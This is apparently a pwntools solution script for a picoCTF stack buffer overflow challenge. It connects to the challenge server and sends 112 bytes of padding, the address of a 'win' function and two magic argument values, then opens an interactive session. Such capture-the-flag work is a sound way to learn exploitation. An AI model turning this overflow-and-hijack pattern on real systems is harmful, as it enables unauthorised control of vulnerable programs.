from pwn import *

r = remote("saturn.picoctf.net", 60374)

win = 0x08049296
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
payload = b"a"*112 + p32(win) + b"a"*4 + p32(arg1) + p32(arg2)
r.sendline(payload)
r.interactive()